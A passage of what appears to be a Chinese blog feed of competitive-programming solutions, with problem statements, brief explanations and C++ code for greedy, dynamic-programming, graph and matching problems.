        <content type="html"><![CDATA[<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><ul><li>带限期和罚款的单位时间任务调度<ul><li>按期限排序<ul><li>用优先队列维护</li><li>若当前时间完成的任务数少于该时间能完成的任务数,直接将权值入队</li><li>若已经相等,取出队列中最小的元素与当前权值比较,将较大的入队</li><li>最后累加队列中的元素权值,$v$减去这个和即为答案</li></ul></li></ul></li></ul></blockquote><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding:"></a>Coding:</h3><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;queue&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=1e3+10;int n,l,v,ans;struct fy{    int x,y;    bool operator&lt;(const fy&amp;a)    const{return x&lt;a.x;};}q[maxn];struct ffy{    int x;    bool operator&lt;(const ffy&amp;a)    const{return x&gt;a.x;}};priority_queue&lt;ffy&gt;qq;int main(){    scanf(&quot;%d%d&quot;,&amp;v,&amp;n);    for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;q[i].x);    for(int i=1;i&lt;=n;i++)    {        scanf(&quot;%d&quot;,&amp;q[i].y);        ans+=q[i].y;    }    sort(q+1,q+1+n);    for(int i=1;i&lt;=n;i++)    {        int a=q[i].x;        int b=q[i].y;        if(l&lt;a)        {            qq.push((ffy){b});            l++;        }        else         {            int c=qq.top().x;            if(b&gt;c)            {                qq.pop();                qq.push((ffy){b});            }        }    }    while(!qq.empty())    {        ans-=qq.top().x;        qq.pop();    }    printf(&quot;%d\n&quot;,v-ans);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 一本通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
            <tag> 优先队列 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>核电站问题</title>
      <link href="/2018/10/23/%E6%A0%B8%E7%94%B5%E7%AB%99%E9%97%AE%E9%A2%98/"/>
      <url>/2018/10/23/%E6%A0%B8%E7%94%B5%E7%AB%99%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>一个核电站有N个放核物质的坑，坑排列在一条直线上。如果连续M个坑中放入核物质，则会发生爆炸，于是，在某些坑中可能不放核物质.现在，请你计算：对于给定的N和M，求不发生爆炸的放置核物质的方案总数。</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>很简单的一道DP,我们定义$F[i][j]$表示第$i$个坑已经连续装了$j$个核物质,那么状态无外乎两种:</strong> </p><ol><li>下一个坑继续装</li><li>下一个坑不装</li></ol><p><strong>答案就是$\sum_{i=0}^mF[n][i]$</strong></p></blockquote><ul><li>当连续放$m$个坑的时候,就会发生爆炸,所以$m$应该减一</li><li>初始条件是$F[0][0]=1$</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=110;int n,m;ll f[maxn][10];int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);    f[0][0]=1;m--;    for(int i=1;i&lt;=n;i++)    {        for(int j=0;j&lt;=m;j++)        f[i][0]+=f[i-1][j];        for(int j=1;j&lt;=m;j++)        f[i][j]+=f[i-1][j-1];    }    ll ans=0;    for(int i=0;i&lt;=m;i++)ans+=f[n][i];    printf(&quot;%lld\n&quot;,ans);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTEwMDIyMjk0M119-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性DP </tag>
            
            <tag> vijos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>刷油漆</title>
      <link href="/2018/10/23/%E5%88%B7%E6%B2%B9%E6%BC%86/"/>
      <url>/2018/10/23/%E5%88%B7%E6%B2%B9%E6%BC%86/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>cxm 需要给一块长木板刷上油漆。他一次可以将一段的木板刷上同一种颜色，刷过的木板可以再刷成其他颜色。现在木板被分成了若干块，每块需要涂成一个确定的颜色。 cxm 希望你告诉他最少需要涂几次就可以将每块都涂成需要的颜色。</p></blockquote><ul><li>区间DP</li><li>$turn$函数比较迷</li><li>有十分有毒~(学长有毒)~</li></ul><p>还是比较简单的区间DP,就是在区间DP基础上加了一个$turn$<br>虽然我没搞懂$turn$<del>(但我拿了90,滑稽)</del></p><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=2010;int n,t,s[maxn];int f[maxn][maxn];int turn(int a,int b,int c){    if(s[a]==s[b]||s[a]==s[c+1]||s[c]==s[b]||s[c]==s[c+1])return -1;    return 0;}int main(){    freopen(&quot;paint.in&quot;,&quot;r&quot;,stdin);    freopen(&quot;paint.out&quot;,&quot;w&quot;,stdout);    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        memset(f,0x3f,sizeof f);        scanf(&quot;%d&quot;,&amp;n);        for(int i=1;i&lt;=n;i++)        {             scanf(&quot;%d&quot;,&amp;s[i]);             f[i][i]=1;        }        for(int l=1;l&lt;=n;l++)for(int i=1;i+l&lt;=n;i++)        {             int j=i+l;for(int k=i;k&lt;j;k++)             f[i][j]=min(f[i][j],f[i][k]+f[k+1][j]+turn(i,j,k));        }        printf(&quot;%d\n&quot;,f[1][n]);    }}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbODkxMjY4MjZdfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区间DP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>烽火传递</title>
      <link href="/2018/10/23/%E7%83%BD%E7%81%AB%E4%BC%A0%E9%80%92/"/>
      <url>/2018/10/23/%E7%83%BD%E7%81%AB%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>在某两座城市之间有 n 个烽火台，每个烽火台发出信号都有一定的代价。为了使情报准确的传递，在任意相邻的 m 个烽火台中至少要有一个发出信号。现在需要计算总共最少需要花费多少代价，才能使敌军来袭之时，情报能在这两座城市之间准确的传递。</p><ul><li>单调队列优化 <pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=1e5+10,inf=1e9+7;int n,t,m,f[maxn][2],v[maxn];int q[maxn&lt;&lt;1],p[maxn&lt;&lt;1];int main(){  freopen(&quot;flame.in&quot;,&quot;r&quot;,stdin);  freopen(&quot;flame.out&quot;,&quot;w&quot;,stdout);  scanf(&quot;%d&quot;,&amp;t);  while(t--)  {      scanf(&quot;%d%d&quot;,&amp;n,&amp;m);      for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;v[i]);       int t=0,h=1;      for(int i=1;i&lt;=n;i++)      {           int a=0;          if(i-p[h]&gt;m)h++;          if(i&gt;m)a=v[i]+q[h];else a=v[i];          while(t&gt;=h&amp;&amp;q[t]&gt;a)t--;           q[++t]=a;p[t]=i;      }      int ans=inf;      if(n-p[h]&gt;=m)h++;      for(int i=max(h,t-m+1);i&lt;=t;i++)      ans=min(ans,q[i]);      printf(&quot;%d\n&quot;,ans);  }  return 0;}</code></pre></li></ul><hr><p>可以加一位n+1,直接作为ans,省去后面的ans统计<br><br>可以省去一些麻烦(<del>比如3个小时</del>)</p><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=1e5+10,inf=1e9+7;int n,t,m,f[maxn][2],v[maxn];int q[maxn&lt;&lt;1],p[maxn&lt;&lt;1];int main(){    freopen(&quot;flame.in&quot;,&quot;r&quot;,stdin);    freopen(&quot;flame.out&quot;,&quot;w&quot;,stdout);    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        scanf(&quot;%d%d&quot;,&amp;n,&amp;m);        for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;v[i]);         int t=0,h=1;        for(int i=1;i&lt;=n+1;i++)//n+1        {             int a=0;            if(i-p[h]&gt;m)h++;            if(i&gt;m)a=v[i]+q[h];else a=v[i];            while(t&gt;=h&amp;&amp;q[t]&gt;a)t--;             q[++t]=a;p[t]=i;        }        printf(&quot;%d\n&quot;,q[t]);//直接输出    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTE3MDU4NzM2OThdfQ==--></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单调队列优化DP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>球和盒子问题</title>
      <link href="/2018/10/23/%E7%90%83%E5%92%8C%E7%9B%92%E5%AD%90%E9%97%AE%E9%A2%98/"/>
      <url>/2018/10/23/%E7%90%83%E5%92%8C%E7%9B%92%E5%AD%90%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><img src="https://s1.ax1x.com/2018/10/12/itXzw9.jpg" alt=""></p><ul><li>$F[i][j]=F[i-1][j-1]+j*F[i-1]<a href="F[1][1]=1">j</a>$</li><li>$G[i][j]=G[i][j-1]+G[i-j]<a href="G[0][i]=G[1][i]=G[i][1]=1">j</a>$</li><li>注意各种情况的初始化</li></ul><h3 id="1-放苹果"><a href="#1-放苹果" class="headerlink" title="1.放苹果"></a>1.放苹果</h3><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=20;int t,n,m;int f[maxn][maxn];int main(){    scanf(&quot;%d&quot;,&amp;t);    for(int i=0;i&lt;=10;i++)f[0][i]=f[i][1]=f[1][i]=1;    for(int i=1;i&lt;=10;i++)for(int j=2;j&lt;=10;j++)    {        f[i][j]=f[i][j-1];        if(i&gt;=j)f[i][j]+=f[i-j][j];    }    while(t--)    {        scanf(&quot;%d%d&quot;,&amp;n,&amp;m);        printf(&quot;%d\n&quot;,f[n][m]);    }    return 0;}</code></pre><h3 id="2-数的划分"><a href="#2-数的划分" class="headerlink" title="2.数的划分"></a>2.数的划分</h3><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=210;int n,m;ll f[maxn][maxn];int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);    for(int i=0;i&lt;=n;i++)f[0][i]=f[1][i]=f[i][1]=1;    for(int i=2;i&lt;=n;i++)for(int j=1;j&lt;=m;j++)    {        f[i][j]=f[i][j-1];        if(i&gt;=j)f[i][j]+=f[i-j][j];    }    printf(&quot;%lld\n&quot;,f[n-m][m]);    return 0;}</code></pre><h3 id="6-小朋友的球"><a href="#6-小朋友的球" class="headerlink" title="6.小朋友的球"></a>6.小朋友的球</h3><pre><code class="lang-cpp">//这题要高精#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=110;int n,m;ll f[maxn][maxn];int main(){    f[1][1]=1;    for(int i=2;i&lt;=100;i++)for(int j=1;j&lt;=100;j++)    f[i][j]=f[i-1][j-1]+f[i-1][j]*j;    while(scanf(&quot;%d%d&quot;,&amp;n,&amp;m)==2)    {        printf(&quot;%lld\n&quot;,f[n][m]);    }    return 0;}</code></pre><h3 id="8-盒子和小球"><a href="#8-盒子和小球" class="headerlink" title="8.盒子和小球"></a>8.盒子和小球</h3><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=20;int n,m,f[maxn][maxn];int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);f[1][1]=m;    for(int i=2;i&lt;=n;i++)for(int j=1;j&lt;=m;j++)    f[i][j]=f[i-1][j-1]*(m-j+1)+f[i-1][j]*j;    printf(&quot;%d\n&quot;,f[n][m]);    return 0;}</code></pre><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=20;int n,m,f[maxn][maxn];int work(int a){    int ans=1;    for(int i=2;i&lt;=a;i++)    ans*=i;    return ans;}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);f[1][1]=1;    for(int i=2;i&lt;=n;i++)for(int j=1;j&lt;=m;j++)    f[i][j]=f[i-1][j-1]+f[i-1][j]*j;    printf(&quot;%d\n&quot;,f[n][m]*work(m));    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTA3ODk0NTYwNCwxNjc5NzYzNDE0XX0=-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计数DP </tag>
            
            <tag> 组合数学 </tag>
            
            <tag> 递推 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>贪心五种常见模型</title>
      <link href="/2018/10/23/%E8%B4%AA%E5%BF%83%E4%BA%94%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%A8%A1%E5%9E%8B/"/>
      <url>/2018/10/23/%E8%B4%AA%E5%BF%83%E4%BA%94%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="1-区间不相交问题"><a href="#1-区间不相交问题" class="headerlink" title="1. 区间不相交问题"></a>1. 区间不相交问题</h3><blockquote><ul><li>按右端点排序</li><li>枚举,当左端点未被标记时,$ans++$,标记右端点 </li></ul><hr><h3 id="2-区间选点问题"><a href="#2-区间选点问题" class="headerlink" title="2. 区间选点问题"></a>2. 区间选点问题</h3><ul><li>按右端点排序</li><li>枚举,当该区间未被选够点时,从后往前选择未被选择的点,直到选够</li></ul><hr><h3 id="3-区间覆盖问题"><a href="#3-区间覆盖问题" class="headerlink" title="3. 区间覆盖问题"></a>3. 区间覆盖问题</h3><ul><li>按左端点排序</li><li>枚举,选择能覆盖当前节点,右端点最远的节点,将当前节点更新为该最远节点的右端点</li></ul><hr><h3 id="4-流水作业调度问题"><a href="#4-流水作业调度问题" class="headerlink" title="4. 流水作业调度问题"></a>4. 流水作业调度问题</h3><ul><li>Johnson算法(<del>比较迷,反正我没懂</del>)</li><li>按$min(i.a,j.b)&lt;min(i.b,j.a)$排序</li><li>枚举记录$ans$</li></ul><hr><h3 id="5-带限期和罚款的单位时间任务调度"><a href="#5-带限期和罚款的单位时间任务调度" class="headerlink" title="5. 带限期和罚款的单位时间任务调度"></a>5. 带限期和罚款的单位时间任务调度</h3><ul><li>按期限排序</li><li>用优先队列维护</li><li>若当前时间完成的任务数少于该时间能完成的任务数,直接将权值入队</li><li>若已经相等,取出队列中最小的元素与当前权值比较,将较大的入队</li><li>最后累加队列中的元素权值</li></ul></blockquote><!--stackedit_data:eyJoaXN0b3J5IjpbMjA5OTg2OTc5NV19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>过河</title>
      <link href="/2018/10/23/%E8%BF%87%E6%B2%B3/"/>
      <url>/2018/10/23/%E8%BF%87%E6%B2%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p><a href="https://www.luogu.org/problemnew/show/P1052" target="_blank" rel="noopener"><strong>P1052</strong>  过河</a></p></blockquote><ul><li>排序</li><li>离散化</li><li>DP</li></ul><blockquote><p><strong>桥很长,不能直接DP;而石子数比较少,这时我们想到离散化;<br>当两点间的距离$d$大于$t$时,一定可以由d%t跳过来,所以最多只需要t+d%t种距离的状态就可以表示这两个石子之间的任意距离关系.这样就把题目中的$10^9$压缩成了$2\times t\times m$最多不超过$2000$,然后就可以放心大胆地用DP了.不过要注意题目中的”当青蛙跳到或跳过坐标为L的点时.就算青蛙已经跳出了独木桥”,所以DP的终点是一个范围而非确切的一个点，最后还要在这个范围内取最小值。</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;using namespace std;const int maxn=2e3+10;int l,s,t,m,n;int f[maxn],lo[200];bool use[maxn];int main(){    scanf(&quot;%d%d%d%d&quot;,&amp;l,&amp;s,&amp;t,&amp;m);    memset(f,0x3f,sizeof f);f[0]=0;    for(int i=1;i&lt;=m;i++)scanf(&quot;%d&quot;,&amp;lo[i]);    sort(lo+1,lo+1+m);    for(int i=1;i&lt;=m;i++)    {        if(lo[i]-lo[i-1]&gt;=t)n+=(lo[i]-lo[i-1])%t+t;        else n+=(lo[i]-lo[i-1]);        use[n]=true;    }    n+=(l-lo[m])%t;    for(int i=1;i&lt;=n+t-1;i++)    {        for(int j=s;j&lt;=t;j++)if(i-j&gt;=0)        f[i]=min(f[i],f[i-j]);        if(use[i])f[i]++;    }    int ans=1e9;    for(int i=n;i&lt;=n+t-1;i++)ans=min(ans,f[i]);    printf(&quot;%d\n&quot;,ans);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMjIyNTQyMTM3XX0=-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性DP </tag>
            
            <tag> 离散化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逐个击破</title>
      <link href="/2018/10/23/%E9%80%90%E4%B8%AA%E5%87%BB%E7%A0%B4/"/>
      <url>/2018/10/23/%E9%80%90%E4%B8%AA%E5%87%BB%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>现在有N个城市，其中K个被敌方军团占领了，N个城市间有N-1条公路相连，破坏其中某条公路的代价是已知的，现在，告诉你K个敌方军团所在的城市，以及所有公路破坏的代价，请你算出花费最少的代价将这K个地方军团互相隔离开，以便第二步逐个击破敌人。</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>我们加一个辅助数组记录每个城市是否被占领,然后跑最大生成树.当且仅当两个城市所在的连通块都被占领时,我们不取这条边,其余时候将当前两个城市的占领属性合并,最后 $ans$=用总代价-最大生成树权值和</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=1e5+10;int n,k,fa[maxn];ll ans;bool ee[maxn];struct fy{    int from,to,d;    bool operator&lt;(const fy&amp;a)    const{return d&gt;a.d;};}q[maxn];int find(int a){    while(a!=fa[a])a=fa[a]=fa[fa[a]];    return a;}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;k);    for(int i=1;i&lt;=k;i++)    {        int a;        scanf(&quot;%d&quot;,&amp;a);        ee[a]=true;    }    for(int i=1;i&lt;=n;i++)fa[i]=i;    for(int i=1;i&lt;n;i++)    {        scanf(&quot;%d%d%d&quot;,&amp;q[i].from,&amp;q[i].to,&amp;q[i].d);        ans+=q[i].d;    }    sort(q+1,q+n);    for(int i=1;i&lt;n;i++)    {        int a=find(q[i].from);        int b=find(q[i].to);        if(ee[a]&amp;&amp;ee[b])continue;        fa[a]=b;        ee[a]|=ee[b];ee[b]|=ee[a];//合并属性        ans-=q[i].d;    }     printf(&quot;%lld\n&quot;,ans);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbNjQ2MDkzNzk2XX0=-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生成树 </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>钓鱼</title>
      <link href="/2018/10/23/%E9%92%93%E9%B1%BC/"/>
      <url>/2018/10/23/%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>一条路上有$N$个鱼塘,鱼塘$i$花5$min$可以钓$t_i$条鱼,但每钓一次能钓到的鱼数量会减去$s_i$,并且从鱼塘$i$走到鱼塘$i+1$会花费$5\times dis_i$的时间.现在有$H$小时的时间,可以在任意鱼塘结束,求最多能钓多少条鱼</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>非常巧妙的一道贪心题.<br>我们枚举结束的鱼塘,用总时间减去路上花掉的时间,剩下的时间用来钓鱼.<br>先将路上经过的鱼塘第一个5$min$能钓到的鱼条数加入优先队列,每次取出队列中最大元素的加入该鱼塘的答案,将该元素减去对应的$s_i$加入队列,直到时间用尽或者优先队列中最大值小于等于0,更新答案</strong></p></blockquote><ul><li>注意时间的转化</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;queue&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=110;int n,h,dis[maxn],ans,bns;int s[maxn],ss[maxn];struct ffy{    int x,y;    bool operator&lt;(const ffy&amp;a)    const{return x&lt;a.x;};};priority_queue&lt;ffy&gt;qq;int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;h);h*=12;    for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;s[i]);    for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;ss[i]);    for(int i=2;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;dis[i]);    for(int i=1;i&lt;=n;i++)    {        h-=dis[i];int time=0;bns=0;        for(int j=1;j&lt;=i;j++)qq.push((ffy){s[j],j});        while(++time&lt;=h&amp;&amp;!qq.empty())        {            int a=qq.top().x;            int b=qq.top().y;            if(a&lt;=0)break;            bns+=a;            qq.pop();            qq.push((ffy){a-ss[b],b});        }        ans=max(ans,bns);    }    printf(&quot;%d\n&quot;,ans);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMzYyNzgzMzY1XX0=-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
            <tag> 单调队列 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>铺地板</title>
      <link href="/2018/10/23/%E9%93%BA%E5%9C%B0%E6%9D%BF/"/>
      <url>/2018/10/23/%E9%93%BA%E5%9C%B0%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>NS 中学新建了一个 n × n 的正方形广场，现在需要你用 1 × 2 的地板砖去铺这个广场。由于各种原因，广场上有些地方不能铺地板（比如那里种了一棵树或者有一个井盖）。显然，地板也不能重叠放置. 现在你需要求出最少有多少个格子不能被地板铺上（包括不能铺地板的地方）。</p></blockquote><ul><li>看出二分图</li><li>然后 $AC$ ~(滑稽)~</li></ul><p>只要看出是二分图模型就非常简单<br>建双向边得出的$ans$最大匹配的二倍<br>但因为一条边连接两个点所以直接输出$n^2-ans$</p><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=70;int n,head[maxn*maxn],num,p[maxn*maxn];int cnt,t,map[maxn][maxn];bool use[maxn*maxn];int mx[4]={0,0,-1,1};int my[4]={1,-1,0,0};char str[maxn];struct fy{int to,next;}q[maxn*maxn*10];void add(int a,int b){q[++num]=(fy){b,head[a]};head[a]=num;}bool find(int a){    for(int i=head[a];i;i=q[i].next)    {        int b=q[i].to;        if(!use[b])        {            use[b]=true;            if(!p[b]||find(p[b]))            {                p[b]=a;                return true;            }        }    }    return false;}int main(){    freopen(&quot;floor.in&quot;,&quot;r&quot;,stdin);    freopen(&quot;floor.out&quot;,&quot;w&quot;,stdout);    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        scanf(&quot;%d&quot;,&amp;n);memset(head,0,sizeof head);        cnt=0;num=0;memset(map,0,sizeof map);        memset(p,0,sizeof p);        for(int i=1;i&lt;=n;i++)        {            scanf(&quot;%s&quot;,str);            for(int j=0;j&lt;n;j++)            if(str[j]==&#39;.&#39;)map[i][j+1]=++cnt;        }        for(int i=1;i&lt;=n;i++)for(int j=1;j&lt;=n;j++)        if(map[i][j])        {            int a=map[i][j];            for(int k=0;k&lt;4;k++)            {                int b=map[i+mx[k]][j+my[k]];                if(b)add(a,b);            }        }        int ans=0;        for(int i=1;i&lt;=cnt;i++)        {            memset(use,false,sizeof use);            if(find(i))ans++;        }        printf(&quot;%d\n&quot;,n*n-ans);    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTE0NTYyNTc3MzBdfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二分图 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>元旦晚会</title>
      <link href="/2018/10/23/%E5%85%83%E6%97%A6%E6%99%9A%E4%BC%9A/"/>
      <url>/2018/10/23/%E5%85%83%E6%97%A6%E6%99%9A%E4%BC%9A/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p><a href="https://www.luogu.org/problemnew/show/P1986" target="_blank" rel="noopener"><strong>P1986</strong>  元旦晚会</a></p></blockquote><ul><li>差分约束</li><li>最长路</li></ul><p>差分裸题</p><blockquote><ol><li>dis[i]&gt;=dis[i-1]</li><li>dis[i]-dis[i-1]&lt;=1</li><li>dis[b]-dis[a-1]&gt;=c</li></ol></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;queue&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=3e4+10,inf=-1e9;int n,m,head[maxn],num,root,dis[maxn];bool use[maxn];struct fy{int from,to,d,next;}q[maxn&lt;&lt;2];void add(int a,int b,int c){q[++num]=(fy){a,b,c,head[a]};head[a]=num;}void sp(){    for(int i=1;i&lt;=n;i++)dis[i]=inf;dis[root]=0;    queue&lt;int&gt;qq;qq.push(root);use[root]=true;    while(!qq.empty())    {        int a=qq.front();qq.pop();use[a]=false;        for(int i=head[a];i;i=q[i].next)        {            int b=q[i].to;            if(dis[b]&lt;dis[a]+q[i].d)            {                dis[b]=dis[a]+q[i].d;                if(!use[b]){use[b]=true;qq.push(b);}            }        }    }}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);int a,b,c;    root=maxn;int out=0;    for(int i=1;i&lt;=n;i++)    {        add(i,i-1,-1);        add(i-1,i,0);    }    for(int i=1;i&lt;=m;i++)    {        scanf(&quot;%d%d%d&quot;,&amp;a,&amp;b,&amp;c);        root=min(a-1,root);        out=max(out,b);        add(a-1,b,c);    }    sp();    printf(&quot;%d\n&quot;,dis[out]);    return 0;}</code></pre><p>差分约束算是非常复杂的方法<br>这题其实可以用贪心来做(区间选点模型)<br><!--stackedit_data:eyJoaXN0b3J5IjpbLTY3NTU2OTYzNl19--></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 差分约束 </tag>
            
            <tag> 最长路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HDU warm up</title>
      <link href="/2018/10/23/HDU%20warm%20up/"/>
      <url>/2018/10/23/HDU%20warm%20up/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>有一张联通的无向图,再加一条无向边后最少的桥的数量</p></blockquote><ul><li>求桥时将边双缩点,记录桥数 <strong>ans</strong></li><li>建树,求最长路长度 <strong>bns</strong></li><li>答案为 <strong>ans-bns</strong> </li><li>多组数据,注意初始化</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=2e5+10,maxm=1e6+10;int n,m,head[maxn],num,cnt,bi,ans;int dfn[maxn],low[maxn],input,fa[maxn],pa[maxn];int xx[maxn],w,headd[maxn],numm,mdep,ww;struct fy{int from,to,next,h;}q[maxm&lt;&lt;1];struct ffy{int to,next;}qq[maxm&lt;&lt;1];void add(int a,int b){    q[++num]=(fy){a,b,head[a],++bi};head[a]=num;    q[++num]=(fy){b,a,head[b],bi};head[b]=num;}void addd(int a,int b){qq[++numm]=(ffy){b,headd[a]};headd[a]=numm;}void tar(int a){    dfn[a]=low[a]=++input;xx[++w]=a;    for(int i=head[a];i;i=q[i].next)    {        int b=q[i].to;if(q[i].h==pa[a])continue;        if(!dfn[b])        {            pa[b]=q[i].h;tar(b);            low[a]=min(low[a],low[b]);            if(dfn[a]&lt;low[b])ans++;        }        else low[a]=min(low[a],dfn[b]);    }    if(low[a]==dfn[a])    {        ++cnt;        while(xx[w+1]!=a)        {            fa[xx[w]]=cnt;            w--;        }    }}void dfs(int a,int fat,int dep){    if(dep&gt;mdep)    {        mdep=dep;        ww=a;    }    for(int i=headd[a];i;i=qq[i].next)    {        int b=qq[i].to;if(b==fat)continue;        dfs(b,a,dep+1);    }}int main(){    int a,b;    